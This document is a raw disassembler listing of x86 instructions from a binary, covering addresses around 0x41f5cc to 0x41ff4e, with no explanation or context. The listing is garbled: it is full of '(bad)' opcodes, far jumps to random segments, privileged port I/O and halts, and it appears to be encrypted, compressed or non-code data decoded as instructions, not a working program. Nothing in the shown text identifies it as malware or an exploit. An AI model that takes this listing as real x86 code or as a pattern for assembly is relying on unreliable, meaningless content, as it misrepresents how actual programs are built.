  41f5cc:	lds    esi,FWORD PTR [ebx-0x5f7312ed]
  41f5d2:	pop    ebp
  41f5d3:	jne    0x41f5db
  41f5d5:	(bad)  
  41f5d6:	mov    ecx,0x825269cc
  41f5db:	lods   eax,DWORD PTR ds:[esi]
  41f5dc:	jnp    0x41f64f
  41f5de:	xor    eax,0x57189d27
  41f5e3:	push   ss
  41f5e4:	or     ebx,DWORD PTR [eax+0x15ecfcdf]
  41f5ea:	pop    ds
  41f5eb:	push   0xffffff99
  41f5ed:	sahf   
  41f5ee:	(bad)  
  41f5ef:	push   ebx
  41f5f0:	retf   0x36be
  41f5f3:	fcmove st,st(3)
  41f5f5:	(bad)  [ecx]
  41f5f7:	and    DWORD PTR [ebx+0x2f17bf64],ecx
  41f5fd:	inc    esi
  41f5fe:	inc    edx
  41f5ff:	sbb    eax,0x5249761e
  41f604:	mov    al,0x9c
  41f606:	(bad)  
  41f607:	or     al,0x56
  41f609:	es pop ebp
  41f60b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f60c:	xor    bl,ah
  41f60e:	outs   dx,WORD PTR ds:[esi]
  41f610:	mov    esi,0xd134978d
  41f615:	xchg   edx,eax
  41f616:	push   ebx
  41f617:	ja     0x41f636
  41f619:	and    edx,edi
  41f61b:	jb     0x41f63e
  41f61d:	(bad)  
  41f61e:	repz jmp 0x41f647
  41f621:	shr    BYTE PTR [esi-0x2d5e47d7],cl
  41f627:	mov    ds:0x2fe5fa55,eax
  41f62c:	test   eax,0x6d12dfff
  41f631:	dec    ecx
  41f632:	dec    edx
  41f633:	xchg   esp,eax
  41f634:	jo     0x41f653
  41f636:	les    edx,FWORD PTR ds:0x647c1d04
  41f63c:	add    DWORD PTR [esi+ecx*8],edx
  41f63f:	adc    dh,bl
  41f641:	out    0xf6,al
  41f643:	xlat   BYTE PTR ds:[ebx]
  41f644:	fiadd  WORD PTR [edx+0x6041b58]
  41f64a:	mov    esp,0xacc202e8
  41f64f:	scas   eax,DWORD PTR es:[edi]
  41f650:	sub    al,0xd8
  41f652:	packuswb mm0,QWORD PTR [ebx]
  41f655:	shl    DWORD PTR [edx],0x36
  41f658:	xor    cl,bh
  41f65a:	jo     0x41f6c0
  41f65c:	inc    ebx
  41f65d:	sti    
  41f65e:	cmp    bh,BYTE PTR [esi+0x49a566f6]
  41f664:	es stos BYTE PTR es:[edi],al
  41f666:	push   ss
  41f667:	xor    BYTE PTR fs:[edx],0x13
  41f66b:	fidivr DWORD PTR [ebp+0x12]
  41f66e:	sbb    DWORD PTR [ebx],0xf
  41f671:	sub    BYTE PTR [ebp-0x5b],ah
  41f674:	adc    BYTE PTR [edx+0x66],ah
  41f677:	aas    
  41f678:	mov    al,0x61
  41f67a:	sar    DWORD PTR [edi-0x79],0x33
  41f67e:	loopne 0x41f655
  41f680:	add    ebp,DWORD PTR [edx]
  41f682:	adc    DWORD PTR [edi],0x19
  41f685:	xchg   bh,dl
  41f687:	sub    edx,DWORD PTR [ebx-0x12]
  41f68a:	push   esi
  41f68b:	aas    
  41f68c:	cwde   
  41f68d:	inc    ecx
  41f68e:	loope  0x41f61f
  41f690:	sar    DWORD PTR [ebp-0x80],cl
  41f693:	in     eax,dx
  41f694:	mov    ch,bl
  41f696:	add    eax,0x2d574c61
  41f69b:	stos   BYTE PTR es:[edi],al
  41f69c:	pushf  
  41f69d:	das    
  41f69e:	(bad)  
  41f69f:	dec    edi
  41f6a0:	aaa    
  41f6a1:	hlt    
  41f6a2:	mov    ebx,0xb9dbf8f
  41f6a7:	test   al,0x42
  41f6a9:	xchg   edi,eax
  41f6aa:	jno    0x41f674
  41f6ac:	fcomi  st,st(5)
  41f6ae:	or     dl,dh
  41f6b0:	repnz popf 
  41f6b2:	add    ch,0x79
	...
  41f715:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    ecx,ecx
  41f723:	push   ds
  41f724:	inc    ebx
  41f725:	ja     0x41f771
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [ebx],bh
  41f72f:	inc    ebx
  41f730:	jmp    0x34de:0x9c140974
  41f737:	sub    edi,0xfffffff6
  41f73a:	pushf  
  41f73b:	sti    
  41f73c:	sti    
  41f73d:	adc    eax,0x47ab0d87
  41f742:	mov    dl,0x40
  41f744:	xor    ch,BYTE PTR [eiz*1-0x6ee851d5]
  41f74b:	jae    0x41f7ae
  41f74d:	or     ebx,DWORD PTR [edi+eax*4]
  41f750:	neg    BYTE PTR [edx]
  41f752:	rol    BYTE PTR [ebx-0xc],cl
  41f755:	(bad)  
  41f757:	in     eax,dx
  41f758:	mov    dh,0x32
  41f75a:	and    ebp,esp
  41f75c:	in     al,0x4b
  41f75e:	rol    DWORD PTR [ebx],1
  41f760:	inc    esp
  41f761:	jmp    0x41f7d4
  41f763:	sbb    eax,0xede6f386
  41f768:	sub    DWORD PTR [esp+ebx*1-0x1cbc211d],0xffffff96
  41f770:	popa   
  41f771:	cli    
  41f772:	add    al,0x17
  41f774:	es je  0x41f76a
  41f777:	and    bh,BYTE PTR [edx+0x2b]
  41f77a:	mov    eax,0xdb7ea3c9
  41f77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f780:	stos   BYTE PTR es:[edi],al
  41f781:	add    bh,BYTE PTR [ebx-0x22445804]
  41f787:	push   esi
  41f788:	pop    esi
  41f789:	xor    BYTE PTR [ebp+ecx*4+0x0],dh
  41f78d:	lods   al,BYTE PTR ds:[esi]
  41f78e:	jmp    0x7972e926
  41f793:	int3   
  41f794:	cdq    
  41f795:	dec    ecx
  41f796:	cmc    
  41f797:	pop    esp
  41f798:	xchg   edi,eax
  41f799:	jae    0x41f744
  41f79b:	push   es
  41f79c:	(bad)  
  41f79e:	sbb    DWORD PTR [edi+0x2e],edx
  41f7a1:	dec    ebx
  41f7a2:	test   BYTE PTR [edx+0x7b],ch
  41f7a5:	sbb    ebx,0xffffff9e
  41f7a8:	or     DWORD PTR [ebp+ebx*2+0x1e],esi
  41f7ac:	mov    ah,BYTE PTR [edx+0x40e1248]
  41f7b2:	nop
  41f7b3:	rol    DWORD PTR [ebp+0x56],1
  41f7b6:	add    DWORD PTR [edx+eax*8],edx
  41f7b9:	loopne 0x41f824
  41f7bb:	scas   eax,DWORD PTR es:[edi]
  41f7bc:	inc    ecx
  41f7bd:	rcl    DWORD PTR [ebx-0x58],cl
  41f7c0:	add    eax,0x8c654cc2
  41f7c5:	mov    eax,0x909f15a3
  41f7ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7cb:	retf   0xf859
  41f7ce:	xor    edx,edx
  41f7d0:	imul   edx,DWORD PTR [esi],0xba302d7f
  41f7d6:	loopne 0x41f847
  41f7d8:	fwait
  41f7d9:	pop    ebx
  41f7da:	inc    ebx
  41f7db:	out    0xcf,al
  41f7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7de:	test   eax,0x3710abf8
  41f7e3:	or     DWORD PTR ds:[ebx],ebp
  41f7e6:	fistp  QWORD PTR [esi]
  41f7e8:	adc    eax,0x97f6a7d
  41f7ed:	jb     0x41f7fc
  41f7ef:	inc    edx
  41f7f0:	mov    ebx,DWORD PTR [ebx+0x5f]
  41f7f3:	clc    
  41f7f4:	pusha  
  41f7f5:	repz cs push 0x8
  41f7f9:	dec    ecx
  41f7fa:	pop    ds
  41f7fb:	push   ds
  41f7fc:	cmp    ah,BYTE PTR [ecx+edx*2-0x7b]
  41f800:	mov    esp,0xba531810
  41f805:	mov    ah,0x72
  41f807:	push   0xffffffbf
  41f809:	adc    ebp,DWORD PTR [esi]
  41f80b:	cmp    BYTE PTR [esi],cl
  41f80d:	lods   al,BYTE PTR ds:[esi]
  41f80e:	sahf   
  41f80f:	mov    esi,0xdce6ae27
  41f814:	adc    eax,0xf2cad84b
  41f819:	and    ah,al
  41f81b:	adc    eax,0xc18aa779
  41f820:	scas   al,BYTE PTR es:[edi]
  41f821:	mov    DWORD PTR [edi-0x33bb69d4],ecx
  41f827:	jl     0x41f821
  41f829:	mov    ds:0x9926f17d,al
  41f82e:	add    dh,BYTE PTR [eax-0xf9b3e5]
  41f834:	push   edx
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    eax,DWORD PTR ds:0x5132292a
  41f8a7:	dec    esi
  41f8a8:	add    DWORD PTR [eax],eax
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [ebp+0x148612f],al
  41f8b3:	retf   
  41f8b4:	aaa    
  41f8b5:	sahf   
  41f8b6:	cld    
  41f8b7:	sub    esp,DWORD PTR [ebx+ebx*4-0x39b78052]
  41f8be:	adc    eax,0xcd2f3b3f
  41f8c3:	xor    al,0xd0
  41f8c5:	adc    bl,BYTE PTR [edi+edi*1+0x9]
  41f8c9:	cmp    ebx,esp
  41f8cb:	mov    dh,0x95
  41f8cd:	or     al,ah
  41f8cf:	add    BYTE PTR [ebp+0x517c3042],dh
  41f8d5:	jmp    0x4c00:0xeb9f2753
  41f8dc:	or     al,0xbd
  41f8de:	stos   BYTE PTR es:[edi],al
  41f8df:	out    0x59,al
  41f8e1:	add    al,BYTE PTR [ebp+edx*2-0x1f]
  41f8e5:	sbb    dl,BYTE PTR ss:[eax-0x4dec7d39]
  41f8ec:	push   ebp
  41f8ed:	sbb    eax,DWORD PTR [edx+0x1c2d9e26]
  41f8f3:	jno    0x41f8f0
  41f8f5:	shl    dh,1
  41f8f7:	stos   BYTE PTR es:[edi],al
  41f8f8:	out    dx,eax
  41f8f9:	lods   al,BYTE PTR ds:[esi]
  41f8fa:	ror    BYTE PTR [ecx-0x6f1a1d33],1
  41f900:	sub    esp,DWORD PTR [esi-0x7a52cab0]
  41f906:	call   0x216b9848
  41f90b:	mov    ebx,ebp
  41f90d:	cmp    eax,0xc9f4f283
  41f912:	gs popf 
  41f914:	fisttp DWORD PTR [esi-0x14]
  41f917:	cld    
  41f918:	push   esi
  41f919:	sar    BYTE PTR [ebx],0xb1
  41f91c:	(bad)  
  41f91d:	jnp    0x41f990
  41f91f:	adc    BYTE PTR ds:0xfefce4b1,dh
  41f925:	push   es
  41f926:	and    eax,0xe01f07b2
  41f92b:	sub    DWORD PTR [esp+ecx*1],0xffffff80
  41f92f:	outs   dx,BYTE PTR ds:[esi]
  41f930:	lahf   
  41f931:	ret    
  41f932:	and    eax,0x91f9c937
  41f937:	data16 in al,dx
  41f939:	add    cl,dh
  41f93b:	adc    esp,DWORD PTR [esi+edi*8-0x414123e5]
  41f942:	cmp    ecx,DWORD PTR [ecx+0x4f]
  41f945:	pop    ecx
  41f946:	adc    eax,0x5aeb4a8
  41f94b:	xor    BYTE PTR [esi],dl
  41f94d:	ret    
  41f94e:	mov    esp,edi
  41f950:	jl     0x41f917
  41f952:	dec    eax
  41f953:	and    BYTE PTR [edi-0x2b],0x77
  41f957:	fisttp WORD PTR [edi+0x79]
  41f95a:	pop    di
  41f95c:	fwait
  41f95d:	sub    BYTE PTR [edx-0x5020da9f],cl
  41f963:	cmp    bh,BYTE PTR [edx]
  41f965:	hlt    
  41f966:	xor    BYTE PTR [edx-0x5b],0x3d
  41f96a:	xor    al,0xfc
  41f96c:	mov    dh,0x54
  41f96e:	sbb    eax,0xcd5dd50b
  41f973:	jle    0x41f9c5
  41f975:	mov    cl,cl
  41f977:	cmp    ebp,DWORD PTR [ecx+0x219c14b5]
  41f97d:	xchg   dh,dh
  41f97f:	enter  0x78c5,0xed
  41f983:	mov    eax,0x23b12ce6
  41f988:	and    BYTE PTR [eax+0x72],dh
  41f98b:	inc    eax
  41f98c:	sub    edi,0xff74c5a
  41f992:	fmul   DWORD PTR [ebp-0xd13bb49]
  41f998:	inc    ebx
  41f999:	jecxz  0x41f9b1
  41f99b:	test   BYTE PTR [ebp+0x720088c7],ah
  41f9a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9a2:	pop    ss
  41f9a3:	out    0xa2,al
  41f9a5:	jne    0x41f9a0
  41f9a7:	jle    0x41f9be
  41f9a9:	inc    edx
  41f9aa:	lds    ebp,FWORD PTR [esi-0x47]
  41f9ad:	sub    al,0x93
  41f9af:	sbb    bh,BYTE PTR [edx+0x6d7fff34]
	...
  41fa15:	add    BYTE PTR [edx],cl
  41fa17:	inc    ecx
  41fa18:	mov    bh,0xa1
  41fa1a:	push   edi
  41fa1c:	push   ds
  41fa1d:	jmp    0x41f9ba
  41fa1f:	mov    eax,0xba1e8e70
  41fa24:	add    eax,0x14f584e
  41fa29:	add    BYTE PTR [edi],al
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    BYTE PTR ds:0xb46b00d6,bl
  41fa33:	mov    dl,0xcf
  41fa35:	jp     0x41fa07
  41fa37:	mov    al,0xb9
  41fa39:	aam    0x42
  41fa3b:	sahf   
  41fa3c:	pop    edx
  41fa3d:	mov    esp,0x94a121e0
  41fa42:	je     0x41fa79
  41fa44:	retf   
  41fa45:	repz mov ecx,0x2eafb666
  41fa4b:	jne    0x41fa24
  41fa4d:	pop    ebx
  41fa4e:	enter  0xc601,0xc
  41fa52:	mov    esp,0x53a96505
  41fa57:	out    dx,eax
  41fa58:	fs test al,0xcd
  41fa5b:	jne    0x41faab
  41fa5d:	cwde   
  41fa5e:	pop    ecx
  41fa5f:	test   eax,0x1e246ddf
  41fa64:	dec    ebx
  41fa65:	mov    ch,0x63
  41fa67:	popf   
  41fa68:	imul   ebx,DWORD PTR [esi],0xffffffa6
  41fa6b:	xlat   BYTE PTR ds:[ebx]
  41fa6c:	sbb    eax,0xfcc1669e
  41fa71:	jmp    0xcc3a:0x13a88d6f
  41fa78:	pop    edi
  41fa79:	add    ecx,DWORD PTR [ecx-0x1b]
  41fa7c:	cli    
  41fa7d:	int    0x1e
  41fa7f:	scas   al,BYTE PTR es:[edi]
  41fa80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa81:	or     ecx,DWORD PTR [esi+0xa93c917]
  41fa87:	rcr    DWORD PTR [esi+0x19a69a4f],0x15
  41fa8e:	pop    esi
  41fa8f:	mov    esp,es
  41fa91:	xchg   edi,eax
  41fa92:	lods   al,BYTE PTR ds:[esi]
  41fa93:	push   ss
  41fa94:	inc    edx
  41fa95:	pop    es
  41fa96:	jmp    0x41fa28
  41fa98:	push   esi
  41fa99:	scas   al,BYTE PTR es:[edi]
  41fa9a:	pop    esi
  41fa9b:	int    0x64
  41fa9d:	mov    ah,0xa0
  41fa9f:	mov    eax,0x4d258c3a
  41faa4:	xchg   cl,ah
  41faa6:	xor    eax,0x199f7c88
  41faab:	cli    
  41faac:	inc    esp
  41faad:	ret    0x2e7a
  41fab0:	int3   
  41fab1:	call   0xa34a73c4
  41fab6:	dec    eax
  41fab7:	je     0x41facb
  41fab9:	ins    BYTE PTR es:[edi],dx
  41faba:	push   0x17
  41fabc:	stos   BYTE PTR es:[edi],al
  41fabd:	push   0xaee144b4
  41fac2:	adc    edi,DWORD PTR [edi+0x7888c1a8]
  41fac8:	fwait
  41fac9:	arpl   WORD PTR [ecx],si
  41facb:	sub    al,0x68
  41facd:	hlt    
  41face:	sar    BYTE PTR [ecx+0x53a7a28],1
  41fad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fad5:	mov    bl,0xda
  41fad7:	mov    ds:0xb2595e86,eax
  41fadc:	mov    dl,0x79
  41fade:	dec    edx
  41fadf:	out    0xce,eax
  41fae1:	mov    dl,0x8
  41fae3:	xor    bh,BYTE PTR [ebx+0xf]
  41fae6:	test   eax,esi
  41fae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fae9:	jno    0x41fb14
  41faeb:	in     eax,0xd8
  41faed:	int3   
  41faee:	out    dx,al
  41faef:	mov    edx,0xbed25da6
  41faf4:	js     0x41fa96
  41faf6:	mov    ch,0x48
  41faf8:	cmp    eax,0xb6d98338
  41fafd:	mov    WORD PTR [ecx-0x67],gs
  41fb00:	iret   
  41fb01:	sub    eax,0x29df67a2
  41fb06:	jge    0x41fb57
  41fb08:	add    BYTE PTR [edx-0x5d],0x8b
  41fb0c:	mov    ds:0x5ed4fe00,al
  41fb11:	xchg   ecx,eax
  41fb12:	scas   al,BYTE PTR es:[edi]
  41fb13:	lea    esi,[ebx]
  41fb15:	sub    bh,cl
  41fb17:	add    ebp,ebp
  41fb19:	sub    eax,0x2a8e87ec
  41fb1e:	pop    ecx
  41fb1f:	je     0x41fb0a
  41fb21:	push   ecx
  41fb22:	dec    ebx
  41fb23:	xor    eax,0x1384f9c4
  41fb28:	out    dx,eax
  41fb29:	sub    DWORD PTR [edx-0xb9c9775],eax
  41fb2f:	psllw  mm3,mm7
  41fb32:	pop    ds
  41fb33:	lock out dx,eax
	...
  41fb95:	add    ah,bl
  41fb97:	sub    BYTE PTR [edx-0x119011c],cl
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0x8f
  41fba3:	xor    al,0xf8
  41fba5:	push   esp
  41fba6:	pop    edi
  41fba7:	push   eax
  41fba8:	add    DWORD PTR [eax],eax
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    cl,cl
  41fbaf:	iret   
  41fbb0:	push   ecx
  41fbb1:	mov    ebx,0xf84bb9d7
  41fbb6:	imul   edi,DWORD PTR [eax],0xfec52f82
  41fbbc:	push   ss
  41fbbd:	dec    ecx
  41fbbe:	adc    DWORD PTR [ecx-0x4cafeaad],0xffffffa2
  41fbc5:	test   eax,0xf8e8f715
  41fbca:	imul   DWORD PTR [esi]
  41fbcc:	(bad)  
  41fbce:	int3   
  41fbcf:	ret    
  41fbd0:	call   0x5b9ba9a3
  41fbd5:	rol    DWORD PTR ds:0xe8ef8c35,cl
  41fbdb:	pop    edx
  41fbdc:	xor    ebx,esp
  41fbde:	jae    0x41fc4a
  41fbe0:	out    0x89,eax
  41fbe2:	xchg   esp,eax
  41fbe3:	out    dx,al
  41fbe4:	xchg   ecx,eax
  41fbe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe6:	mov    ebp,0x85511f6a
  41fbeb:	inc    ebp
  41fbec:	push   eax
  41fbed:	mov    eax,ds:0x734e18c2
  41fbf2:	and    al,0xc1
  41fbf4:	push   eax
  41fbf5:	jp     0x41fbae
  41fbf7:	pop    eax
  41fbf8:	inc    esi
  41fbf9:	enter  0xb0ef,0x24
  41fbfd:	push   0xffffff9b
  41fbff:	dec    esi
  41fc00:	es inc ebp
  41fc02:	mov    dh,0xad
  41fc04:	out    dx,eax
  41fc05:	add    BYTE PTR fs:[eax-0xf],0xe4
  41fc0a:	push   ecx
  41fc0b:	pop    esp
  41fc0c:	in     eax,dx
  41fc0d:	cmc    
  41fc0e:	xor    DWORD PTR [eax-0x664580aa],ecx
  41fc14:	push   cs
  41fc15:	mov    cs,WORD PTR [eax]
  41fc17:	mov    ebx,0x11b5e623
  41fc1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1d:	loope  0x41fc49
  41fc1f:	in     al,0xa0
  41fc21:	sbb    eax,0x7f46d43
  41fc26:	mov    ecx,0xc2bef59a
  41fc2b:	scas   al,BYTE PTR es:[edi]
  41fc2c:	(bad)  
  41fc2d:	xor    ecx,ebp
  41fc2f:	fild   QWORD PTR [ebx]
  41fc31:	sub    al,ch
  41fc33:	test   eax,0x59a79864
  41fc38:	imul   edx,DWORD PTR [eax+ebx*8],0x943533ed
  41fc3f:	xor    BYTE PTR [esp+ecx*2+0x65],ah
  41fc43:	dec    ebx
  41fc44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc45:	pop    es
  41fc46:	fcmovne st,st(6)
  41fc48:	cmc    
  41fc49:	in     eax,dx
  41fc4a:	aas    
  41fc4b:	jae    0x41fc78
  41fc4d:	popa   
  41fc4e:	xchg   ebx,eax
  41fc4f:	adc    BYTE PTR [ebx],cl
  41fc51:	sahf   
  41fc52:	dec    ecx
  41fc53:	sub    eax,0xbe230ca0
  41fc58:	add    ah,BYTE PTR [edx-0x3e]
  41fc5b:	lds    ebp,FWORD PTR [ebx-0x7c]
  41fc5e:	shr    ch,0xf7
  41fc61:	sbb    dl,BYTE PTR [edi-0x4f]
  41fc64:	mov    dl,0xbb
  41fc66:	call   0x8f359348
  41fc6b:	adc    ecx,ebx
  41fc6d:	mov    dl,0x1b
  41fc6f:	(bad)  
  41fc70:	outs   dx,DWORD PTR ds:[esi]
  41fc71:	xchg   ecx,eax
  41fc72:	jns    0x41fc9e
  41fc74:	xor    al,0xf1
  41fc76:	rol    BYTE PTR [ecx+ecx*4-0x3132adeb],0x53
  41fc7e:	stos   BYTE PTR es:[edi],al
  41fc7f:	and    dl,BYTE PTR es:[ebx+0x4c4deeab]
  41fc86:	xchg   ecx,eax
  41fc87:	xor    BYTE PTR [ecx-0x5e073df3],dh
  41fc8d:	adc    dl,BYTE PTR [eax+0x68128e91]
  41fc93:	cs nop
  41fc95:	int    0xe0
  41fc97:	aam    0x7f
  41fc99:	mov    dl,0xc0
  41fc9b:	enter  0x480f,0x39
  41fc9f:	adc    cl,ah
  41fca1:	sahf   
  41fca2:	jecxz  0x41fc66
  41fca4:	or     bl,bl
  41fca6:	push   ss
  41fca7:	es out 0x6a,al
  41fcaa:	sub    eax,DWORD PTR [edx-0x11c80ccf]
  41fcb0:	gs stos DWORD PTR es:[edi],eax
  41fcb2:	mov    WORD PTR [ebp-0x77],ss
	...
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	outs   dx,BYTE PTR ds:[esi]
  41fd23:	jmp    0x1:0x516679b2
  41fd2a:	pop    es
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    ah,bh
  41fd2f:	loopne 0x41fd00
  41fd31:	xchg   edx,eax
  41fd32:	push   edi
  41fd33:	jg     0x41fdab
  41fd35:	pop    ebp
  41fd36:	mov    bh,0x63
  41fd38:	add    al,0xbc
  41fd3a:	mov    esi,0xcbbc1b2d
  41fd3f:	sbb    al,0x8a
  41fd41:	push   edi
  41fd42:	(bad)  
  41fd43:	xchg   ecx,eax
  41fd44:	loop   0x41fdbd
  41fd46:	ss loopne 0x41fd72
  41fd49:	out    dx,al
  41fd4a:	push   ecx
  41fd4b:	stos   DWORD PTR es:[edi],eax
  41fd4c:	pop    eax
  41fd4d:	xchg   ebp,eax
  41fd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd4f:	and    ebx,DWORD PTR [edi+0x50]
  41fd52:	shr    BYTE PTR [ecx+edx*4+0x75477a67],cl
  41fd59:	fcom   DWORD PTR [edi-0x46]
  41fd5c:	fcomip st,st(4)
  41fd5e:	call   0x57dc:0xddf9f1b3
  41fd65:	mov    ch,0xf
  41fd67:	push   cs
  41fd68:	inc    edi
  41fd69:	popf   
  41fd6a:	cmp    DWORD PTR [eax],edi
  41fd6c:	rol    eax,0x32
  41fd6f:	(bad)  
  41fd70:	fisttp DWORD PTR [edx-0x52959f28]
  41fd76:	mov    dl,0x3e
  41fd78:	push   ds
  41fd79:	mov    al,0x4b
  41fd7b:	out    dx,eax
  41fd7c:	add    BYTE PTR [eax+0x78],ah
  41fd7f:	fimul  DWORD PTR [eax+ebp*4]
  41fd82:	pop    edx
  41fd83:	(bad)  
  41fd84:	nop
  41fd85:	(bad)  
  41fd86:	fistp  DWORD PTR [esp+esi*2]
  41fd89:	scas   eax,DWORD PTR es:[edi]
  41fd8a:	mov    dh,0x5f
  41fd8c:	retf   0x718d
  41fd8f:	dec    esp
  41fd90:	aam    0xde
  41fd92:	in     eax,dx
  41fd93:	cmc    
  41fd94:	pop    ebp
  41fd95:	adc    DWORD PTR [edx-0x78],eax
  41fd98:	mov    ebx,0x9be0e910
  41fd9d:	mov    BYTE PTR [esi+0x3],dh
  41fda0:	push   0xfffffff2
  41fda2:	shl    DWORD PTR [esi+0x25],0x2f
  41fda6:	test   DWORD PTR [eax+0x60cdfd5e],edx
  41fdac:	push   0x23d4e176
  41fdb1:	dec    ecx
  41fdb2:	cli    
  41fdb3:	in     al,0xc4
  41fdb5:	imul   ebx
  41fdb7:	pop    ecx
  41fdb8:	sbb    al,0x15
  41fdba:	mov    edi,0x92c6ed37
  41fdbf:	fcmovnu st,st(0)
  41fdc1:	sbb    al,0x97
  41fdc3:	in     al,dx
  41fdc4:	xor    ebp,ecx
  41fdc6:	cmp    BYTE PTR [eax-0x6b],dh
  41fdc9:	fadd   DWORD PTR [edx-0x5f]
  41fdcc:	enter  0x7c52,0x55
  41fdd0:	sahf   
  41fdd1:	mov    ch,0x9f
  41fdd3:	clc    
  41fdd4:	and    eax,0xec7f80a3
  41fdd9:	mov    ah,0x52
  41fddb:	xor    eax,0x6caaf643
  41fde0:	shl    BYTE PTR [ebp+0x34],0x76
  41fde4:	test   al,0xa5
  41fde6:	jnp    0x41fda7
  41fde8:	pop    ebp
  41fde9:	sbb    al,0xf8
  41fdeb:	jmp    0x41fddc
  41fded:	add    eax,0x24a8b783
  41fdf2:	cmp    al,0xf9
  41fdf4:	push   esp
  41fdf5:	or     eax,0xc477738e
  41fdfa:	jp     0x41fe0c
  41fdfc:	inc    edx
  41fdfd:	arpl   WORD PTR [edx-0xa],dx
  41fe00:	nop
  41fe01:	pop    esp
  41fe02:	outs   dx,BYTE PTR ds:[esi]
  41fe03:	js     0x41fe39
  41fe05:	cli    
  41fe06:	stos   BYTE PTR es:[edi],al
  41fe07:	call   0xa5e3:0x4228ba19
  41fe0e:	(bad)  
  41fe0f:	stos   DWORD PTR es:[edi],eax
  41fe10:	xchg   ebx,eax
  41fe11:	sub    eax,0x4123d8dc
  41fe16:	mov    DWORD PTR [edi],eax
  41fe18:	xlat   BYTE PTR ds:[ebx]
  41fe19:	pop    ss
  41fe1a:	pop    esp
  41fe1b:	rcr    DWORD PTR ds:0x7893fadd,0x63
  41fe22:	sub    esi,DWORD PTR [ebx+0x3ad48467]
  41fe28:	(bad)  
  41fe29:	popf   
  41fe2a:	mov    bh,0x32
  41fe2c:	imul   BYTE PTR [ebx+0x25]
  41fe2f:	mov    bl,0x26
  41fe31:	cmp    BYTE PTR [eax+0x1b23],dl
	...
  41fe93:	add    BYTE PTR [eax],al
  41fe95:	add    BYTE PTR [edx-0x1865ab],ch
  41fe9b:	out    dx,eax
  41fe9c:	call   FWORD PTR [ebp+0x51]
  41fe9f:	lock xor DWORD PTR [edi+0x1],0x4b
  41fea4:	mov    fs,esi
  41fea6:	ins    DWORD PTR es:[edi],dx
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [eax+0x54],al
  41feb0:	hlt    
  41feb1:	xor    BYTE PTR [eax],bh
  41feb3:	xchg   edi,eax
  41feb4:	lods   eax,DWORD PTR gs:[esi]
  41feb6:	sub    bl,BYTE PTR ds:0xe7cc17da
  41febc:	repz les ebx,FWORD PTR [edx+0x26bc3eb2]
  41fec3:	outs   dx,DWORD PTR ds:[esi]
  41fec4:	cmp    BYTE PTR [ecx],al
  41fec6:	add    ecx,eax
  41fec8:	fs (bad) 
  41feca:	sub    al,0x8c
  41fecc:	xor    BYTE PTR [ecx+0x7c],0x88
  41fed0:	or     ebp,ebx
  41fed2:	lods   eax,DWORD PTR ds:[esi]
  41fed3:	bnd jbe 0x41fecd
  41fed6:	(bad)  
  41fed8:	sbb    DWORD PTR [edx-0x1db41411],esp
  41fede:	ds cs ja 0x41fe7b
  41fee2:	std    
  41fee3:	scas   eax,DWORD PTR es:[edi]
  41fee4:	adc    esp,eax
  41fee6:	adc    ah,BYTE PTR [edi+eax*1]
  41fee9:	add    ebx,eax
  41feeb:	mov    ?,edx
  41feed:	std    
  41feee:	jmp    0x463b9c89
  41fef3:	pop    edi
  41fef4:	clc    
  41fef5:	cmp    BYTE PTR [eax],cl
  41fef7:	mov    ebp,0x619bfca3
  41fefc:	or     al,0xf6
  41fefe:	cmp    al,0x3c
  41ff00:	dec    eax
  41ff01:	fcmovbe st,st(0)
  41ff03:	add    DWORD PTR [edi+0x68690887],esi
  41ff09:	stos   BYTE PTR es:[edi],al
  41ff0a:	sbb    DWORD PTR [edi-0x5b50aa91],edx
  41ff10:	in     eax,dx
  41ff11:	fldcw  WORD PTR [ebx+0x46]
  41ff14:	lods   eax,DWORD PTR ds:[esi]
  41ff15:	cwde   
  41ff16:	sti    
  41ff17:	repz fnsave cs:0x419b069
  41ff1f:	mov    esi,0x6d3f83cd
  41ff24:	mov    edx,0x4ebfe59
  41ff29:	mov    dl,0x42
  41ff2b:	push   edx
  41ff2c:	ds scas eax,DWORD PTR es:[edi]
  41ff2e:	adc    BYTE PTR [ebx-0x1],al
  41ff31:	add    DWORD PTR [esi+0x25],0x5
  41ff35:	or     edi,DWORD PTR [ecx+0x31b4de7f]
  41ff3b:	mov    al,ds:0xd0681126
  41ff40:	sbb    ebx,ecx
  41ff42:	dec    edi
  41ff43:	mov    edi,0x6afd98e2
  41ff48:	mov    edi,DWORD PTR [ecx-0x603705ac]
  41ff4e:	pop    ss
